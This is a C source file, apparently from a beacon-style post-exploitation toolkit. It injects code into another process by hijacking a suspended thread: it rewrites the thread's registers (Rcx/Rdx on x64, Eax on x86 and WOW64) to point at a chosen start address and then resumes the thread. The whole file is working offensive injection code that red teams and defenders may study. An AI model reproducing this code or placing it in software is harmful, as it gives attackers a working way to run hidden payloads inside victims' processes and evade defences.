#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <Tlhelp32.h>
#include "beacon.h"
#include "inject.h"

/*
* SetThreadContext / ResumeThread
*/
#if defined _M_X64
BOOL inject_via_resumethread_x64(HANDLE hThread, LPVOID lpStartAddress, LPVOID lpParameter) {
	CONTEXT ctx;

	/* try to query some information about our thread */
	ctx.ContextFlags = CONTEXT_INTEGER;
	if (!GetThreadContext(hThread, &ctx))
		return FALSE;

	/* update the Rcx value to our new start address, use Rdx to pass a parameter */
	ctx.Rcx = (DWORD64)lpStartAddress;
	ctx.Rdx = (DWORD64)lpParameter;
	if (!SetThreadContext(hThread, &ctx))
		return FALSE;

	/* kick off the thread, please */
	return ResumeThread(hThread) != -1;
}

BOOL inject_via_resumethread_x86(HANDLE hThread, LPVOID lpStartAddress, LPVOID lpParameter) {
	WOW64_CONTEXT ctx;

	/* we can't pass a parameter this way; so fail now... */
	if (lpParameter != NULL)
		return FALSE;

	/* try to query some information about our thread */
	ctx.ContextFlags = CONTEXT_INTEGER;
	if (!Wow64GetThreadContext(hThread, &ctx))
		return FALSE;

	/* update the Eax value to our new start address */
	ctx.Eax = (DWORD)lpStartAddress;
	if (!Wow64SetThreadContext(hThread, &ctx))
		return FALSE;

	/* kick off the thread, please */
	return ResumeThread(hThread) != -1;
}

BOOL inject_via_resumethread(INJECTCONTEXT * injctx, LPVOID lpStartAddress, LPVOID lpParameter) {
	if (injctx->targetArch == INJECT_ARCH_X86) {
		return inject_via_resumethread_x86(injctx->hThread, lpStartAddress, lpParameter);
	}
	else {
		return inject_via_resumethread_x64(injctx->hThread, lpStartAddress, lpParameter);
	}
}

#elif defined _M_IX86
BOOL inject_via_resumethread(INJECTCONTEXT * injctx, LPVOID lpStartAddress, LPVOID lpParameter) {
	CONTEXT ctx;

	/* not going to work; x86 -> *, we can't pass arguments this way */
	if (lpParameter != NULL)
		return FALSE;

	/* probably not going to work, not going to be able to update thread context */
	if (!injctx->sameArch)
		return FALSE;

	/* try to query some information about our thread */
	ctx.ContextFlags = CONTEXT_INTEGER;
	if (!GetThreadContext(injctx->hThread, &ctx))
		return FALSE;

	/* update the Eax value to our new start address */
	ctx.Eax = (DWORD)lpStartAddress;
	if (!SetThreadContext(injctx->hThread, &ctx))
		return FALSE;

	/* kick off the thread, please */
	return ResumeThread(injctx->hThread) != -1;
}
#endif